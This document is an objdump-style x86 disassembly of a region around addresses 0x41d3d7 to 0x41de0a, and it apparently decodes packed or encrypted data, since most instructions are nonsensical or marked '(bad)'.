  41d3d7:	fidivr DWORD PTR [edi-0xc]
  41d3da:	and    eax,0x47ee58b1
  41d3df:	add    al,0x66
  41d3e1:	(bad)  
  41d3e2:	int    0xcf
  41d3e4:	cmp    al,BYTE PTR ds:0x11ffd21a
  41d3ea:	push   0x1e644478
  41d3ef:	ret    0x3ecf
  41d3f2:	xor    eax,0xeb6e3954
  41d3f7:	lods   al,BYTE PTR ds:[esi]
  41d3f8:	stc    
  41d3f9:	pushf  
  41d3fa:	or     dl,bh
  41d3fc:	mov    eax,0x1fc43eac
  41d401:	aad    0x68
  41d403:	mov    al,ds:0x6507a3ef
  41d408:	(bad)  
  41d409:	rol    BYTE PTR [edx],1
  41d40b:	xchg   ebp,eax
  41d40c:	jmp    0x41d419
  41d40e:	xchg   esi,eax
  41d40f:	cmp    eax,0xcf07eb02
  41d414:	ret    
  41d415:	inc    edi
  41d416:	push   ebp
  41d417:	(bad)  
  41d418:	mov    dl,0xdd
  41d41a:	mov    WORD PTR [ebp-0x27],fs
  41d41d:	arpl   WORD PTR ds:0x9552433f,bp
  41d423:	and    esi,DWORD PTR [edi+ecx*1-0x58]
  41d427:	sahf   
  41d428:	ret    0x8081
  41d42b:	ja     0x41d3e5
  41d42d:	std    
  41d42e:	int3   
  41d42f:	push   eax
  41d430:	jecxz  0x41d464
  41d432:	push   eax
  41d433:	and    edi,DWORD PTR [edi]
  41d435:	(bad)  
  41d436:	scas   ax,WORD PTR es:[edi]
  41d438:	clc    
  41d439:	ja     0x41d3fb
  41d43b:	dec    esp
  41d43c:	and    ebp,DWORD PTR [ebx+0x1306a198]
  41d442:	inc    eax
  41d443:	mov    edi,0x52a1559c
  41d448:	mov    eax,ds:0x18ddf445
  41d44d:	jne    0x41d41d
  41d44f:	pop    ds
  41d450:	(bad)  
  41d451:	jecxz  0x41d418
  41d453:	daa    
  41d454:	fdivrp st(1),st
  41d456:	aaa    
  41d457:	inc    ecx
  41d458:	shl    DWORD PTR [ecx],1
  41d45a:	mov    edi,0xebc55b31
  41d45f:	mov    al,ds:0x453e832d
  41d464:	xchg   edx,eax
  41d465:	imul   eax,DWORD PTR [edi-0x63],0xffffffe5
  41d469:	pushf  
  41d46a:	inc    esp
  41d46b:	inc    edi
  41d46c:	add    al,bh
  41d46e:	bound  esi,QWORD PTR [ecx]
  41d470:	clc    
  41d471:	push   0xffffff84
  41d473:	ins    BYTE PTR es:[edi],dx
  41d474:	push   ecx
  41d475:	iret   
  41d476:	test   eax,0x5e4a8cea
  41d47b:	retf   
  41d47c:	xor    BYTE PTR [ecx+0x4a],bh
  41d47f:	lods   al,BYTE PTR ds:[esi]
  41d480:	cli    
  41d481:	stos   DWORD PTR es:[edi],eax
  41d482:	idiv   BYTE PTR [esi-0x4d]
  41d485:	sbb    eax,0x52753854
  41d48a:	sbb    dl,BYTE PTR [ebx]
  41d48c:	mov    dh,0xe6
  41d48e:	xchg   esp,eax
  41d48f:	call   0x0:0x0
	...
  41d4f2:	add    BYTE PTR [eax],al
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6ca5:0xb1408189
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	cld    
  41d50d:	xor    esp,DWORD PTR [ecx-0x1e]
  41d510:	test   eax,0x539f549c
  41d515:	das    
  41d516:	push   ebp
  41d517:	xor    BYTE PTR [ebx+0x6],dh
  41d51a:	push   0x9edb83db
  41d51f:	push   edi
  41d520:	push   ebp
  41d521:	dec    esi
  41d522:	aaa    
  41d523:	and    ecx,DWORD PTR [ecx-0x3b]
  41d526:	mov    edx,0xe4eb8e79
  41d52b:	rcr    DWORD PTR [eax+0x8],0x18
  41d52f:	mov    edx,0x6b3f31cd
  41d534:	xchg   esi,eax
  41d535:	inc    ebp
  41d536:	xchg   BYTE PTR [edx+0x62756db7],dl
  41d53c:	(bad)  
  41d53e:	cmp    eax,0x81685d3e
  41d543:	jl     0x41d5bf
  41d545:	dec    eax
  41d546:	or     eax,0xde36a216
  41d54b:	div    DWORD PTR [edi+0x3a718d64]
  41d551:	ret    
  41d552:	sub    BYTE PTR [ebx],ch
  41d554:	popf   
  41d555:	add    BYTE PTR [esi+0x30],al
  41d558:	popf   
  41d559:	enter  0x2fec,0x38
  41d55d:	mov    esi,0xdbff835
  41d562:	data16 jecxz 0x41d5aa
  41d565:	xchg   ebp,eax
  41d566:	mov    ds:0xb460c65c,eax
  41d56b:	popa   
  41d56c:	adc    dh,BYTE PTR [esi-0x45]
  41d56f:	inc    esi
  41d570:	and    esi,eax
  41d572:	add    bh,BYTE PTR [edi+0x2a]
  41d575:	mov    edi,0x80c11de9
  41d57a:	jecxz  0x41d59d
  41d57c:	cwde   
  41d57d:	sbb    DWORD PTR [ebp+0xa],ebx
  41d580:	outs   dx,DWORD PTR ds:[esi]
  41d581:	outs   dx,DWORD PTR ds:[esi]
  41d582:	inc    ebp
  41d583:	push   eax
  41d584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d585:	iret   
  41d586:	adc    BYTE PTR [ecx+0x7068509b],cl
  41d58c:	sbb    ebp,DWORD PTR [edx+0x11b3adf5]
  41d592:	jbe    0x41d58c
  41d594:	dec    esi
  41d595:	mov    es,WORD PTR [edx+0x11f512eb]
  41d59b:	bound  ebp,QWORD PTR [ecx]
  41d59d:	lahf   
  41d59e:	std    
  41d59f:	mov    ebp,0xf3608dc6
  41d5a4:	idiv   esp
  41d5a6:	ja     0x41d551
  41d5a8:	hlt    
  41d5a9:	aam    0xcb
  41d5ab:	retf   
  41d5ac:	mov    eax,ds:0xbd6db399
  41d5b1:	ins    BYTE PTR es:[edi],dx
  41d5b2:	js     0x41d576
  41d5b4:	(bad)  [esi-0x58e9afed]
  41d5ba:	std    
  41d5bb:	test   edx,esp
  41d5bd:	jmp    0xcd867848
  41d5c2:	add    BYTE PTR [eax+0x19263af5],dh
  41d5c8:	cmp    BYTE PTR [eax-0x7b243a41],al
  41d5ce:	adc    cl,BYTE PTR [ecx-0x368cdc77]
  41d5d4:	sbb    esi,DWORD PTR ds:0x8a271b52
  41d5da:	inc    ecx
  41d5db:	sub    eax,0x65142d61
  41d5e0:	mov    cl,0x6c
  41d5e2:	call   0x5d6e:0x10aa7365
  41d5e9:	mov    esp,0x124fda02
  41d5ee:	jp     0x41d5bc
  41d5f0:	stos   BYTE PTR es:[edi],al
  41d5f1:	adc    BYTE PTR [esi+0x2fe96da9],0xc9
  41d5f8:	fs cmc 
  41d5fa:	scas   eax,DWORD PTR es:[edi]
  41d5fb:	xchg   ebp,eax
  41d5fc:	arpl   WORD PTR [esi+edx*8-0x78],di
  41d600:	int    0x89
  41d602:	cmp    al,0x1f
  41d604:	lods   al,BYTE PTR ds:[esi]
  41d605:	adc    al,0x2b
  41d607:	jge    0x41d5b7
  41d609:	mov    bh,BYTE PTR ss:[ebx]
  41d60c:	stc    
  41d60d:	lock nop
  41d60f:	jecxz  0x41d611
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xd266e435
  41d681:	xchg   BYTE PTR [ecx+0x13870e5],cl
  41d687:	add    BYTE PTR [ecx+eax*1],al
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	call   0xe5e06d4
  41d691:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41d693:	call   FWORD PTR [ebx+0xf1dc280]
  41d699:	mov    BYTE PTR [edi],ch
  41d69b:	mov    bh,0x11
  41d69d:	mov    esp,0x7624b643
  41d6a2:	dec    edx
  41d6a3:	ss push edx
  41d6a5:	(bad)  
  41d6a6:	jbe    0x41d677
  41d6a8:	push   ds
  41d6a9:	push   es
  41d6aa:	(bad)  
  41d6ab:	nop
  41d6ac:	cmp    BYTE PTR [ecx-0x7c859ea2],dh
  41d6b2:	sbb    BYTE PTR [edi-0x1a],dh
  41d6b5:	fwait
  41d6b6:	cli    
  41d6b7:	dec    ebx
  41d6b8:	mov    ebx,0xee208582
  41d6bd:	push   ecx
  41d6be:	dec    esi
  41d6c0:	retf   
  41d6c1:	hlt    
  41d6c2:	les    ebp,FWORD PTR [edx+0x53c00740]
  41d6c8:	les    ebp,FWORD PTR [edi+eax*2]
  41d6cb:	test   al,0xd7
  41d6cd:	add    ah,BYTE PTR [ecx-0x1a]
  41d6d0:	adc    edi,DWORD PTR [eax]
  41d6d2:	popa   
  41d6d3:	xor    al,0x7d
  41d6d5:	mov    DWORD PTR [edx+edx*1],edi
  41d6d8:	in     al,dx
  41d6d9:	fdivr  DWORD PTR ds:0x89f1e3f4
  41d6df:	and    DWORD PTR [ebx],0x1ba1fb5a
  41d6e5:	not    DWORD PTR [edi-0x1b]
  41d6e8:	test   esi,esi
  41d6ea:	fstp   DWORD PTR [edx+0x50]
  41d6ed:	jne    0x41d750
  41d6ef:	dec    esi
  41d6f0:	jo     0x41d68b
  41d6f2:	ss cld 
  41d6f4:	xlat   BYTE PTR ds:[ebx]
  41d6f5:	jle    0x41d686
  41d6f7:	xor    eax,0xf0ba5b17
  41d6fc:	or     DWORD PTR [ecx+edi*4],eax
  41d6ff:	mov    edi,0x15ae388d
  41d704:	das    
  41d705:	stc    
  41d706:	mov    ?,eax
  41d708:	lods   eax,DWORD PTR ds:[esi]
  41d709:	jmp    0x8441:0xf0f5cbb9
  41d710:	shl    DWORD PTR ds:0x167f43c3,0x12
  41d717:	lock or ecx,edi
  41d71a:	push   edx
  41d71b:	sub    eax,0x76cae26c
  41d720:	pop    ebp
  41d721:	leave  
  41d722:	shr    edx,1
  41d724:	sub    DWORD PTR [ebp-0x68],esp
  41d727:	cmp    cl,dh
  41d729:	pop    esi
  41d72a:	imul   esp,DWORD PTR [esi],0x73
  41d72d:	mov    dl,0x8
  41d72f:	out    0x6e,al
  41d731:	lock push esi
  41d733:	xor    al,0x36
  41d735:	pop    ss
  41d736:	pop    eax
  41d737:	jbe    0x41d736
  41d739:	arpl   WORD PTR [ebx-0x40],bp
  41d73c:	shr    BYTE PTR [eax],1
  41d73e:	mov    ch,0x2
  41d740:	ja     0x41d6f1
  41d742:	pusha  
  41d743:	imul   esp,DWORD PTR [edi+0x6a],0xd448e875
  41d74a:	sbb    ecx,0xffffffed
  41d74d:	sub    cl,bh
  41d74f:	mov    DWORD PTR [edi-0x30],ebx
  41d752:	cmc    
  41d753:	aaa    
  41d754:	bound  edi,QWORD PTR [eax+0x41]
  41d757:	mov    ah,0x9a
  41d759:	das    
  41d75a:	xchg   ebx,eax
  41d75b:	cdq    
  41d75c:	cmp    eax,0xe75e78f1
  41d761:	xchg   esi,esi
  41d763:	mov    ds:0xfeae3d77,al
  41d768:	loope  0x41d748
  41d76a:	mov    ebp,0x4aeb5679
  41d76f:	add    eax,edx
  41d771:	inc    esi
  41d772:	ftst   
  41d774:	xor    BYTE PTR [eax+0x58e1180e],bl
  41d77a:	xchg   esp,eax
  41d77b:	data16 fdivr QWORD PTR es:[esp+ecx*2+0x43]
  41d781:	mov    eax,DWORD PTR [esi+ecx*8-0x80]
  41d785:	or     esi,DWORD PTR [ecx+0x4f]
  41d788:	aad    0x31
  41d78a:	loopne 0x41d737
  41d78c:	(bad)  
  41d78d:	xchg   edi,eax
  41d78e:	inc    eax
  41d78f:	aad    0x0
	...
  41d7f1:	add    BYTE PTR [eax],al
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	inc    esp
  41d801:	loop   0x41d82f
  41d803:	inc    esp
  41d804:	je     0x41d83f
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    al,0x1
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	rcl    BYTE PTR [esi-0x223a4bfb],cl
  41d812:	or     DWORD PTR [ebp+0x5d],esp
  41d815:	or     bl,cl
  41d817:	mov    bh,0xfd
  41d819:	sbb    bl,bh
  41d81b:	mov    WORD PTR [ebp+0x34772b6c],?
  41d821:	mov    ecx,0x66f33c5b
  41d826:	xlat   BYTE PTR ds:[ebx]
  41d827:	shl    BYTE PTR [esi+0x7b0e42c1],0xb5
  41d82e:	lds    edx,FWORD PTR [ecx]
  41d830:	mov    esp,0x365127db
  41d835:	rol    DWORD PTR [esi-0x80],0xe8
  41d839:	jge    0x41d85a
  41d83b:	xor    eax,0xc982428c
  41d840:	lock inc edx
  41d842:	bound  ecx,QWORD PTR [ebx+0x4b]
  41d845:	das    
  41d846:	jo     0x41d838
  41d848:	inc    ebp
  41d849:	int3   
  41d84a:	sar    DWORD PTR [edx-0x1a],0x4a
  41d84e:	cmp    edi,DWORD PTR [ebx+0x1d760ff8]
  41d854:	or     al,0x3c
  41d856:	sbb    al,0xd7
  41d858:	frstor ds:0x252223ae
  41d85e:	inc    esi
  41d85f:	push   0x6a92bf78
  41d864:	sbb    eax,0xce3cd627
  41d869:	sbb    DWORD PTR [ecx],edi
  41d86b:	push   ds
  41d86c:	test   eax,0x844fac27
  41d871:	sub    al,0x5b
  41d873:	test   eax,0xed7df3e3
  41d878:	ds jle 0x41d843
  41d87b:	outs   dx,BYTE PTR ds:[esi]
  41d87c:	test   BYTE PTR [eax+0x32],al
  41d87f:	dec    edi
  41d880:	mov    edi,edx
  41d882:	mov    al,0x4a
  41d884:	jg     0x41d8f0
  41d886:	mov    dh,0xe9
  41d888:	clc    
  41d889:	sbb    DWORD PTR [edi],ebp
  41d88b:	lock sub eax,0xb852ba79
  41d891:	test   al,0x25
  41d893:	xchg   ecx,eax
  41d894:	test   BYTE PTR [edx],cl
  41d896:	push   eax
  41d897:	add    BYTE PTR [ebp+0xfbee3e0],cl
  41d89d:	pop    ss
  41d89e:	push   esi
  41d89f:	hlt    
  41d8a0:	(bad)  
  41d8a1:	cld    
  41d8a2:	cmp    al,0x88
  41d8a4:	in     al,0x2
  41d8a6:	inc    ebp
  41d8a7:	jae    0x41d928
  41d8a9:	or     eax,0x29208520
  41d8ae:	push   eax
  41d8af:	rcl    bl,0x61
  41d8b2:	add    BYTE PTR [ecx+0x16edf141],0xfb
  41d8b9:	mov    ecx,0x1efbfe7d
  41d8be:	cmp    al,0x1b
  41d8c0:	cmp    BYTE PTR [esi+0x6c],bl
  41d8c3:	loope  0x41d8b6
  41d8c5:	inc    ebp
  41d8c6:	mov    bl,ch
  41d8c8:	add    esi,edx
  41d8ca:	dec    esp
  41d8cb:	fnstsw WORD PTR [ebp+0x22]
  41d8ce:	push   edi
  41d8cf:	jecxz  0x41d880
  41d8d1:	pop    eax
  41d8d2:	add    BYTE PTR [ebp-0x11478e61],ah
  41d8d8:	fadd   QWORD PTR [ebx]
  41d8da:	xor    eax,0x1e74a465
  41d8df:	jle    0x41d8b2
  41d8e1:	sahf   
  41d8e2:	iret   
  41d8e3:	jp     0x41d8e1
  41d8e5:	sub    ah,ah
  41d8e7:	jge    0x41d947
  41d8e9:	call   0x1fc85cdf
  41d8ee:	and    DWORD PTR ds:0x8f70f1e0,ebx
  41d8f4:	in     al,0xd8
  41d8f6:	push   ss
  41d8f7:	lds    ecx,FWORD PTR [edx+0x6efb4c1c]
  41d8fd:	scas   al,BYTE PTR es:[edi]
  41d8fe:	sbb    al,0xa2
  41d900:	fadd   st,st(6)
  41d902:	inc    esp
  41d903:	jb     0x41d970
  41d905:	popa   
  41d906:	or     al,0xe9
  41d908:	xchg   ebx,eax
  41d909:	add    DWORD PTR [edx+0x724b7cb3],esi
  41d90f:	cdq    
	...
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs fcmovnu st,st(0)
  41d982:	pop    ebp
  41d983:	push   esp
  41d984:	js     0x41d9c0
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    al,0x1
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	ret    
  41d98d:	mov    cr0,eax
  41d990:	or     BYTE PTR [ecx+0x5e7384c7],bh
  41d996:	sbb    al,0x4a
  41d998:	xabort 0xb4
  41d99b:	push   0xa89f23cb
  41d9a0:	loop   0x41d9c4
  41d9a2:	js     0x41da21
  41d9a4:	pop    edx
  41d9a5:	aam    0x89
  41d9a7:	repz xor eax,0xdb477421
  41d9ad:	or     esi,edx
  41d9af:	das    
  41d9b0:	xchg   edi,eax
  41d9b1:	fstp   DWORD PTR [edx+edi*2+0xf37d322]
  41d9b8:	xchg   esi,eax
  41d9b9:	lock fucom st(6)
  41d9bc:	sub    eax,0xc45125ae
  41d9c1:	dec    ebx
  41d9c2:	mov    edx,0xf54fca1f
  41d9c7:	into   
  41d9c8:	xchg   DWORD PTR [edx-0x15a06960],ecx
  41d9ce:	test   al,0x41
  41d9d0:	sbb    BYTE PTR [ecx-0x68],dh
  41d9d3:	mov    ch,0xc
  41d9d5:	jle    0x41d982
  41d9d7:	add    DWORD PTR [ecx],esp
  41d9d9:	sub    al,0x70
  41d9db:	ss push esp
  41d9dd:	and    DWORD PTR [ebx+0x6035efd7],ebx
  41d9e3:	push   ebp
  41d9e4:	xchg   ebp,eax
  41d9e5:	sahf   
  41d9e6:	sbb    esp,0xffffff82
  41d9e9:	out    dx,al
  41d9ea:	(bad)  
  41d9ec:	clc    
  41d9ed:	imul   eax,DWORD PTR [ebx+ebp*1],0x2f2455b5
  41d9f4:	pop    esi
  41d9f5:	push   ebx
  41d9f6:	out    dx,eax
  41d9f7:	xchg   edi,eax
  41d9f8:	jns    0x41d9e9
  41d9fa:	add    al,BYTE PTR [ecx-0x1d90a79a]
  41da00:	iret   
  41da01:	mov    dl,0xfb
  41da03:	mov    eax,0x77f5ef4a
  41da08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da09:	lods   al,BYTE PTR ds:[esi]
  41da0a:	popa   
  41da0b:	stos   DWORD PTR es:[edi],eax
  41da0c:	push   ebp
  41da0d:	add    BYTE PTR [ecx+0x25],cl
  41da10:	mov    edx,0xce9857ec
  41da15:	nop
  41da16:	dec    ebx
  41da17:	mov    al,ds:0xc2f35855
  41da1c:	cmp    al,0xda
  41da1f:	scas   al,BYTE PTR es:[edi]
  41da20:	fs cli 
  41da22:	fiadd  WORD PTR [eax-0x27]
  41da25:	mov    dl,BYTE PTR [ebx]
  41da27:	bound  edi,QWORD PTR [eax+0x16897bcc]
  41da2d:	retf   0x611b
  41da30:	loopne 0x41d9e4
  41da32:	mov    WORD PTR [ecx],ds
  41da34:	test   ch,0x7
  41da37:	mov    ecx,0xcfd7085a
  41da3c:	pop    esi
  41da3d:	sub    eax,0x1b26c9c5
  41da42:	xlat   BYTE PTR ds:[ebx]
  41da43:	dec    ebp
  41da44:	sub    ch,BYTE PTR [esi+0x780354f2]
  41da4a:	mov    dh,0x8
  41da4c:	xor    al,0xa8
  41da4e:	in     eax,dx
  41da4f:	inc    edx
  41da50:	adc    dh,BYTE PTR [edx]
  41da52:	or     DWORD PTR [ecx+0x43],edx
  41da55:	push   0x3a0afa6d
  41da5a:	mov    ch,0xdc
  41da5c:	iret   
  41da5d:	cmp    eax,DWORD PTR [eax-0x678f4da2]
  41da63:	(bad)  
  41da64:	xchg   esi,eax
  41da65:	stc    
  41da66:	in     al,dx
  41da67:	ror    DWORD PTR [eax-0x51acf773],1
  41da6d:	cwde   
  41da6e:	cdq    
  41da6f:	cmc    
  41da70:	gs (bad) 
  41da72:	shl    BYTE PTR [ebp-0x6cf7a1c8],0x49
  41da79:	mov    ch,ch
  41da7b:	jp     0x41daef
  41da7d:	pop    eax
  41da7e:	xchg   edi,eax
  41da7f:	xor    bl,BYTE PTR [edi-0x46]
  41da82:	stos   BYTE PTR es:[edi],al
  41da83:	loop   0x41da33
  41da85:	imul   DWORD PTR [esi-0x39ed80a6]
  41da8b:	jbe    0x41dafd
  41da8d:	(bad)  
  41da8e:	jae    0x41da7c
	...
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x64
  41db01:	mov    cl,0xce
  41db03:	mov    al,0x7c
  41db05:	cmp    eax,DWORD PTR [ecx]
  41db07:	add    BYTE PTR [ecx+eax*1],al
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	dec    ebp
  41db0d:	pop    esp
  41db0e:	ss int 0x82
  41db11:	pushf  
  41db12:	into   
  41db13:	je     0x41daa9
  41db15:	or     esp,ebx
  41db17:	jbe    0x41daa3
  41db19:	inc    edx
  41db1a:	mov    bl,0x7e
  41db1c:	jo     0x41db79
  41db1e:	(bad)  es:0x12055f2c
  41db25:	xlat   BYTE PTR cs:[ebx]
  41db27:	and    ecx,ebx
  41db29:	ror    DWORD PTR [ebx],1
  41db2b:	ror    DWORD PTR [ecx+0x58],cl
  41db2e:	pop    es
  41db2f:	(bad)  
  41db30:	ds push ecx
  41db32:	sub    BYTE PTR [eax+0x39],bl
  41db35:	sbb    bl,BYTE PTR [edi-0x34ac9131]
  41db3b:	idiv   ecx
  41db3d:	xor    DWORD PTR [eax+edi*2],ebp
  41db40:	cwde   
  41db41:	psubsb mm1,QWORD PTR [eax+0x16]
  41db45:	adc    al,0xa0
  41db47:	xor    eax,0xbd0fcdb0
  41db4c:	in     eax,0xf4
  41db4e:	or     eax,0x4480b05b
  41db53:	lahf   
  41db54:	jle    0x41dbba
  41db56:	mov    al,BYTE PTR [ebx-0x6f]
  41db59:	mov    bl,0xbd
  41db5b:	cmp    BYTE PTR [ebp-0x3c9788c2],0x36
  41db62:	ret    0x4690
  41db65:	sub    edi,0x9ee53e01
  41db6b:	sbb    BYTE PTR [edx],ah
  41db6d:	push   esp
  41db6e:	inc    BYTE PTR fs:[ebx+0x2b]
  41db72:	cmp    ebx,0x49994cff
  41db78:	jmp    0x55dd:0xc63664b3
  41db7f:	sbb    ah,BYTE PTR [ebx+ebx*1]
  41db82:	sub    esp,DWORD PTR [edx+eiz*8-0x4e]
  41db86:	popa   
  41db87:	add    eax,eax
  41db89:	adc    ebp,DWORD PTR [edx]
  41db8b:	data16 in al,0x7
  41db8e:	hlt    
  41db8f:	stos   BYTE PTR es:[edi],al
  41db90:	jmp    0x41dbff
  41db92:	gs push es
  41db94:	sub    eax,0x74a6e9e
  41db99:	icebp  
  41db9a:	enter  0x4cfa,0x7a
  41db9e:	rol    DWORD PTR [ebx+0x4f],0x83
  41dba2:	or     ebp,esp
  41dba4:	(bad)  
  41dba5:	mov    dh,0xde
  41dba7:	sbb    esi,0xd55f7151
  41dbad:	jecxz  0x41dbb8
  41dbaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbb0:	push   ebp
  41dbb1:	mov    al,0x0
  41dbb3:	ins    BYTE PTR es:[edi],dx
  41dbb4:	jns    0x41dc08
  41dbb6:	fwait
  41dbb7:	xchg   ecx,eax
  41dbb8:	pop    ecx
  41dbb9:	ret    
  41dbba:	mov    ds:0x80391d36,eax
  41dbbf:	(bad)  
  41dbc0:	and    BYTE PTR [esi+eiz*4],bl
  41dbc3:	push   edx
  41dbc4:	imul   esp,edx,0x88d6c112
  41dbca:	cmp    bh,BYTE PTR [ebp+0x7a]
  41dbcd:	jmp    0xd384:0xe56f334e
  41dbd4:	add    eax,0x4d334bf0
  41dbd9:	mov    ds:0xeaac0261,al
  41dbde:	ret    
  41dbdf:	fucomi st,st(5)
  41dbe1:	add    eax,0x7d9a68cf
  41dbe6:	push   esi
  41dbe7:	jge    0x41db78
  41dbe9:	test   bl,al
  41dbeb:	jge    0x41dba0
  41dbed:	out    0x3f,eax
  41dbef:	popa   
  41dbf0:	ret    
  41dbf1:	ja     0x41dbdf
  41dbf3:	sbb    al,BYTE PTR [ecx-0x1cbd3b66]
  41dbf9:	inc    esp
  41dbfa:	das    
  41dbfb:	sbb    BYTE PTR [edi+0x4dab8010],dl
  41dc01:	mov    ah,dh
  41dc03:	cld    
  41dc04:	xor    DWORD PTR [ecx-0x2b],esp
  41dc07:	add    edx,ebp
  41dc09:	xor    eax,0xdd227921
  41dc0e:	or     eax,DWORD PTR [edi]
	...
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi-0x614f2fb0]
  41dc81:	inc    edx
  41dc82:	cs and al,0x80
  41dc85:	cmp    al,0x1
  41dc87:	add    BYTE PTR [ecx+eax*1],al
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	out    0xbc,eax
  41dc8e:	cmp    ch,bl
  41dc90:	aad    0x12
  41dc92:	dec    esp
  41dc93:	xlat   BYTE PTR ds:[ebx]
  41dc94:	jae    0x41dc1c
  41dc96:	sbb    edi,esi
  41dc98:	cs pop ebx
  41dc9a:	adc    DWORD PTR [edi+ebp*4-0x70],ecx
  41dc9e:	jg     0x41dd07
  41dca0:	stos   BYTE PTR es:[edi],al
  41dca1:	cdq    
  41dca2:	pop    ebp
  41dca3:	lock mov ds:0xf925678a,al
  41dca9:	mov    ah,0x2a
  41dcab:	mov    bl,0x8a
  41dcad:	inc    ecx
  41dcae:	xchg   esp,eax
  41dcaf:	adc    BYTE PTR [ebx-0xc],bh
  41dcb2:	mov    al,ds:0x46af90b
  41dcb7:	or     DWORD PTR [ecx+0x39],0xff8318f5
  41dcbe:	je     0x41dcf6
  41dcc0:	push   0x3b54cc94
  41dcc5:	mov    ch,0x4
  41dcc7:	in     eax,dx
  41dcc8:	fiadd  WORD PTR cs:[ebx+edx*8-0x38b0cb02]
  41dcd0:	jmp    FWORD PTR [ebx+0x41]
  41dcd3:	cld    
  41dcd4:	mov    esp,DWORD PTR [esi+0x349cc5a7]
  41dcda:	jae    0x41dcd5
  41dcdc:	(bad)  
  41dcdf:	retf   0x6dd4
  41dce2:	cli    
  41dce3:	cmc    
  41dce4:	bound  ecx,QWORD PTR [ebp-0x6d710771]
  41dcea:	push   0xffffffeb
  41dcec:	push   0x598dbd0f
  41dcf1:	pop    esp
  41dcf2:	icebp  
  41dcf3:	inc    edi
  41dcf4:	dec    esi
  41dcf5:	retf   
  41dcf6:	jecxz  0x41dc91
  41dcf8:	fisubr WORD PTR [ebx]
  41dcfa:	gs retf 
  41dcfc:	clc    
  41dcfd:	cmp    esi,ecx
  41dcff:	repnz xlat BYTE PTR ds:[ebx]
  41dd01:	imul   ebp,DWORD PTR [edx+0x3bbd8e79],0x1d
  41dd08:	sub    ebp,DWORD PTR [edx+0x6447466a]
  41dd0e:	aaa    
  41dd0f:	pop    es
  41dd10:	inc    edx
  41dd11:	inc    ebx
  41dd12:	push   ebp
  41dd13:	ss mov edi,0x75dc40a7
  41dd19:	nop
  41dd1a:	shl    DWORD PTR [ebp+0x5b],cl
  41dd1d:	jae    0x41dd95
  41dd1f:	rcl    BYTE PTR [ebx+0x3],1
  41dd22:	inc    ebp
  41dd23:	outs   dx,DWORD PTR ds:[esi]
  41dd24:	in     eax,0x39
  41dd26:	or     eax,0x9676d458
  41dd2b:	mov    esi,esp
  41dd2d:	sub    BYTE PTR [ecx],0x5e
  41dd30:	dec    esp
  41dd31:	push   ecx
  41dd32:	xchg   esp,eax
  41dd33:	sbb    bl,BYTE PTR [esp+edx*1-0x5e]
  41dd37:	mov    esi,0xfd866a73
  41dd3c:	add    bl,dh
  41dd3e:	pop    ebp
  41dd3f:	mov    al,0xe6
  41dd41:	fwait
  41dd42:	jecxz  0x41ddbb
  41dd44:	dec    BYTE PTR [ebx+0x4a]
  41dd47:	pop    ebp
  41dd48:	in     eax,dx
  41dd49:	jae    0x41dd95
  41dd4b:	sbb    DWORD PTR [eax*1+0x3ad20f62],esp
  41dd52:	mov    edx,0x733bb298
  41dd57:	and    edi,DWORD PTR ds:0xd95a6ab1
  41dd5d:	mov    al,0x61
  41dd5f:	sub    ebx,DWORD PTR [ebx+0x1649be4]
  41dd65:	sahf   
  41dd66:	adc    BYTE PTR [ecx-0x3e],bh
  41dd69:	push   es
  41dd6a:	cmp    DWORD PTR [ebx+ecx*1],edx
  41dd6d:	retf   0x1321
  41dd70:	xchg   esp,eax
  41dd71:	inc    esp
  41dd72:	retf   0x89fb
  41dd75:	jmp    0x1b331078
  41dd7a:	fiadd  WORD PTR [eax]
  41dd7c:	test   al,0x2f
  41dd7e:	and    DWORD PTR [edx+0x391e3f39],edi
  41dd84:	stos   DWORD PTR es:[edi],eax
  41dd85:	dec    edx
  41dd86:	sbb    al,0xbb
  41dd88:	aam    0x8
  41dd8a:	pop    ebx
  41dd8b:	push   ebp
  41dd8c:	cld    
  41dd8d:	jmp    FWORD PTR [ecx+0x20]
	...
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	sbb    BYTE PTR [ebp+0x3d84d4ca],bl
  41de06:	add    DWORD PTR [eax],eax
  41de08:	add    al,0x1
  41de0a:	add    BYTE PTR [eax],al
